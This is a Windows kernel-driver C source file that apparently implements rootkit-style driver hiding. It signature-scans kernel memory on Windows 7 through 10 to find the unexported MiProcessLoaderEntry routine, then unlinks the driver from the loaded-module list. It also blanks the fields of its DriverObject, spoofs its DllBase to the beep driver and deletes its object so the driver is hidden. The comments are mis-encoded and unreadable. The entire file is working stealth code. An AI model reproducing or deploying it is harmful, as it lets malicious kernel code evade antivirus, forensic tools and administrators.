#include "hide.h"

PDRIVER_OBJECT g_pDriverObject = NULL;

PVOID GetProcAddress(WCHAR *FuncName)
{
	UNICODE_STRING u_FuncName;
	RtlInitUnicodeString(&u_FuncName, FuncName);
	return MmGetSystemRoutineAddress(&u_FuncName);
}

//��Windows 7��ϵͳ��ȥ����MiProcessLoaderEntry����
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_7()
{
	//���Search_Code����MiProcessLoaderEntry��������ǰ��Ĳ�����
	//WIN7����������Ȥ��MiProcessLoaderEntry�����������EtwWriteString������ǰ�漸������
	//����ֱ������EtwWriteString����Ȼ����ǰ��������
	CHAR Search_Code[] = "\x48\x89\x5C\x24\x08"			//mov     [rsp+arg_0], rbx
		"\x48\x89\x6C\x24\x18"			//mov     [rsp+arg_10], rbp
		"\x48\x89\x74\x24\x20"			//mov     [rsp+arg_18], rsi
		"\x57"							//push    rdi
		"\x41\x54"						//push    r12
		"\x41\x55"						//push    r13
		"\x41\x56"						//push    r14
		"\x41\x57";					//push    r15
	ULONG_PTR EtwWriteStringAddress = 0;
	ULONG_PTR StartAddress = 0;

	EtwWriteStringAddress = (ULONG_PTR)GetProcAddress(L"EtwWriteString");
	StartAddress = EtwWriteStringAddress - 0x1000;
	if (EtwWriteStringAddress == 0)
		return NULL;

	while (StartAddress < EtwWriteStringAddress)
	{
		if (memcmp((CHAR*)StartAddress, Search_Code, strlen(Search_Code)) == 0)
			return (MiProcessLoaderEntry)StartAddress;
		++StartAddress;
	}

	return NULL;
}

//��Windows 8��ϵͳ��ȥ����MiProcessLoaderEntry����
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8()
{
	CHAR Search_Code[] = "\x48\x89\x5C\x24\x08"			//mov     [rsp+arg_0], rbx
		"\x48\x89\x6C\x24\x10"			//mov     [rsp+arg_10], rbp
		"\x48\x89\x74\x24\x18"			//mov     [rsp+arg_18], rsi
		"\x57"							//push    rdi
		"\x48\x83\xEC\x20"				//sub	  rsp, 20h
		"\x48\x8B\xD9";				//mov     rbx, rcx
	ULONG_PTR IoInvalidateDeviceRelationsAddress = 0;
	ULONG_PTR StartAddress = 0;

	IoInvalidateDeviceRelationsAddress = (ULONG_PTR)GetProcAddress(L"IoInvalidateDeviceRelations");
	StartAddress = IoInvalidateDeviceRelationsAddress - 0x1000;
	if (IoInvalidateDeviceRelationsAddress == 0)
		return NULL;

	while (StartAddress < IoInvalidateDeviceRelationsAddress)
	{
		if (memcmp((CHAR*)StartAddress, Search_Code, strlen(Search_Code)) == 0)
			return (MiProcessLoaderEntry)StartAddress;
		++StartAddress;
	}

	return NULL;
}

//��Windows 8.1��ϵͳ��ȥ����MiProcessLoaderEntry����
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8_1()
{
	//IoLoadCrashDumpDriver -> MmLoadSystemImage -> MiProcessLoaderEntry
	//MmUnloadSystemImage -> MiUnloadSystemImage -> MiProcessLoaderEntry
	//��WIN10��MmUnloadSystemImage�ǵ����ģ�WIN8.1��δ����������ֻ������һ��·�ӣ�����IoLoadCrashDumpDriver�ǵ�����

	//��IoLoadCrashDumpDriver����������������Code
	CHAR IoLoadCrashDumpDriver_Code[] = "\x48\x8B\xD0"				//mov     rdx, rax
		"\xE8";						//call	  *******
//��MmLoadSystemImage����������������Code
	CHAR MmLoadSystemImage_Code[] = "\x41\x8B\xD6"					//mov     edx, r14d	
		"\x48\x8B\xCE"					//mov	  rcx, rsi
		"\x41\x83\xCC\x04"				//or	  r12d, 4
		"\xE8";							//call    *******	
	ULONG_PTR IoLoadCrashDumpDriverAddress = 0;
	ULONG_PTR MmLoadSystemImageAddress = 0;
	ULONG_PTR StartAddress = 0;

	IoLoadCrashDumpDriverAddress = (ULONG_PTR)GetProcAddress(L"IoLoadCrashDumpDriver");
	StartAddress = IoLoadCrashDumpDriverAddress;
	if (IoLoadCrashDumpDriverAddress == 0)
		return NULL;

	while (StartAddress < IoLoadCrashDumpDriverAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, IoLoadCrashDumpDriver_Code, strlen(IoLoadCrashDumpDriver_Code)) == 0)
		{
			StartAddress += strlen(IoLoadCrashDumpDriver_Code);								//����һֱ��call��code
			MmLoadSystemImageAddress = *(LONG*)StartAddress + StartAddress + 4;
			break;
		}
		++StartAddress;
	}

	StartAddress = MmLoadSystemImageAddress;
	if (MmLoadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MmLoadSystemImageAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, MmLoadSystemImage_Code, strlen(MmLoadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MmLoadSystemImage_Code);								 //����һֱ��call��code
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}
		++StartAddress;
	}

	return NULL;
}

//��Windows 10��ϵͳ��ȥ����MiProcessLoaderEntry����
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_10()
{
	//MmUnloadSystemImage -> MiUnloadSystemImage -> MiProcessLoaderEntry

	//��MmUnloadSystemImage������������Code
	CHAR MmUnloadSystemImage_Code[] = "\x83\xCA\xFF"				//or      edx, 0FFFFFFFFh
		"\x48\x8B\xCF"				//mov     rcx, rdi
		"\x48\x8B\xD8"				//mov     rbx, rax
		"\xE8";						//call    *******
/*
//��MiUnloadSystemImage������������Code
CHAR MiUnloadSystemImage_Code[] = "\x45\x33\xFF"				//xor     r15d, r15d
								  "\x4C\x39\x3F"				//cmp     [rdi], r15
								  "\x74\x18"					//jz      short
								  "\x33\xD2"					//xor     edx, edx
								  "\x48\x8B\xCF"				//mov     rcx, rdi
								  "\xE8";						//call	  *******
*/
	ULONG_PTR MmUnloadSystemImageAddress = 0;
	ULONG_PTR MiUnloadSystemImageAddress = 0;
	ULONG_PTR StartAddress = 0;

	MmUnloadSystemImageAddress = (ULONG_PTR)GetProcAddress(L"MmUnloadSystemImage");
	StartAddress = MmUnloadSystemImageAddress;
	if (MmUnloadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MmUnloadSystemImageAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, MmUnloadSystemImage_Code, strlen(MmUnloadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MmUnloadSystemImage_Code);								//����һֱ��call��code
			MiUnloadSystemImageAddress = *(LONG*)StartAddress + StartAddress + 4;
			break;
		}
		++StartAddress;
	}

	StartAddress = MiUnloadSystemImageAddress;
	if (MiUnloadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MiUnloadSystemImageAddress + 0x500)
	{
		//����ntoskrnl���Կ��������ڲ�ͬ�汾��win10��call MiProcessLoaderEntryǰ��Ĳ�����ͬ
		//����ÿ��call MiProcessLoaderEntry֮�󶼻�mov eax, dword ptr cs:PerfGlobalGroupMask
		//�����������0xEB(call) , 0x8B 0x05(mov eax)��Ϊ������

		/*if (memcmp((VOID*)StartAddress, MiUnloadSystemImage_Code, strlen(MiUnloadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MiUnloadSystemImage_Code);								 //����һֱ��call��code
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}*/
		if (*(UCHAR*)StartAddress == 0xE8 &&												//call
			*(UCHAR *)(StartAddress + 5) == 0x8B && *(UCHAR *)(StartAddress + 6) == 0x05)	//mov eax,
		{
			StartAddress++;																	//����call��0xE8
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}
		++StartAddress;
	}

	return NULL;
}

MiProcessLoaderEntry g_MiProcessLoaderEntry()
{
	NTSTATUS status;
	MiProcessLoaderEntry m_MiProcessLoaderEntry = NULL;
	RTL_OSVERSIONINFOEXW OsVersion = { 0 };

	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	status = RtlGetVersion(&OsVersion);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("��ȡϵͳ�汾ʧ�ܣ�\n"));
		return NULL;
	}

	if (OsVersion.dwMajorVersion == 10)								//�����Windows 10
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_10();
		KdPrint(("��ǰϵͳ�汾��Windows 10 %d\n", OsVersion.dwBuildNumber));
		if (m_MiProcessLoaderEntry == NULL)
			KdPrint(("��ȡ����MiProcessLoaderEntry��\n"));
		else
			KdPrint(("MiProcessLoaderEntry��ַ�ǣ�%llx\n", (ULONG_PTR)m_MiProcessLoaderEntry));

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 3)
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_8_1();
		KdPrint(("��ǰϵͳ�汾��Windows 8.1\n"));
		if (m_MiProcessLoaderEntry == NULL)
			KdPrint(("��ȡ����MiProcessLoaderEntry��\n"));
		else
			KdPrint(("MiProcessLoaderEntry��ַ�ǣ�%llx\n", (ULONG_PTR)m_MiProcessLoaderEntry));

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 2 && OsVersion.wProductType == VER_NT_WORKSTATION)		//�����Ϊ������Windows 8��Windows Server 2012
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_8();
		KdPrint(("��ǰϵͳ�汾��Windows 8\n"));
		if (m_MiProcessLoaderEntry == NULL)
			KdPrint(("��ȡ����MiProcessLoaderEntry��\n"));
		else
			KdPrint(("MiProcessLoaderEntry��ַ�ǣ�%llx\n", (ULONG_PTR)m_MiProcessLoaderEntry));

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1 && OsVersion.wProductType == VER_NT_WORKSTATION)		//�����Ϊ������Windows 7��Windows Server 2008 R2	
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_7();
		KdPrint(("��ǰϵͳ�汾��Windows 7\n"));
		if (m_MiProcessLoaderEntry == NULL)
			KdPrint(("��ȡ����MiProcessLoaderEntry��\n"));
		else
			KdPrint(("MiProcessLoaderEntry��ַ�ǣ�%llx\n", (ULONG_PTR)m_MiProcessLoaderEntry));

		return m_MiProcessLoaderEntry;
	}

	KdPrint(("��ǰϵͳ��֧�֣�\n"));
	return NULL;
}

NTSTATUS GetDriverObject(PDRIVER_OBJECT *lpObj, WCHAR* DriverDirName)
{
	NTSTATUS status = STATUS_SUCCESS;
	PDRIVER_OBJECT pBeepObj = NULL;
	UNICODE_STRING DevName = { 0 };

	if (!MmIsAddressValid(lpObj))
		return STATUS_INVALID_ADDRESS;

	RtlInitUnicodeString(&DevName, DriverDirName);

	status = ObReferenceObjectByName(&DevName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &pBeepObj);

	if (NT_SUCCESS(status))
		*lpObj = pBeepObj;
	else
	{
		KdPrint(("Get Obj faild...error:0x%x\n", status));
	}

	return status;
}

BOOLEAN SupportSEH(PDRIVER_OBJECT pDriverObject)
{
	PDRIVER_OBJECT pTempDrvObj = NULL;
	PLDR_DATA_TABLE_ENTRY ldr = pDriverObject->DriverSection;
	if (NT_SUCCESS(GetDriverObject(&pTempDrvObj, L"\\Driver\\beep")))
	{
		ldr->DllBase = pTempDrvObj->DriverStart;

		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

VOID KernelSleep(LONG msec)
{
	LARGE_INTEGER my_interval;
	my_interval.QuadPart = DELAY_ONE_MILLISECOND;
	my_interval.QuadPart *= msec;
	KeDelayExecutionThread(KernelMode, 0, &my_interval);
}

VOID DelObject(IN PVOID StartContext)
{
	PULONG_PTR pZero = NULL;
	KernelSleep(5000);
	ObMakeTemporaryObject(g_pDriverObject);
	KdPrint(("test seh.\n"));
	__try {
		*pZero = 0x100;
	}
	__except (1)
	{
		KdPrint(("seh success.\n"));
	}
}

VOID Reinitialize(PDRIVER_OBJECT DriverObject, PVOID Context, ULONG Count)
{
	ULONG *p = NULL;
	BOOLEAN bSupport;
	HANDLE hThread = NULL;
	MiProcessLoaderEntry m_MiProcessLoaderEntry;

	m_MiProcessLoaderEntry = g_MiProcessLoaderEntry();
	if (m_MiProcessLoaderEntry == NULL)
	{
		return;
	}

	bSupport = SupportSEH(DriverObject);

	m_MiProcessLoaderEntry(DriverObject->DriverSection, 0);
	DriverObject->DriverSection = NULL;
	DriverObject->DriverStart = NULL;
	DriverObject->DriverSize = NULL;
	DriverObject->DriverUnload = NULL;
	DriverObject->DriverInit = NULL;
	DriverObject->DeviceObject = NULL;

	if (bSupport)
	{
		PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, DelObject, NULL);
	}
}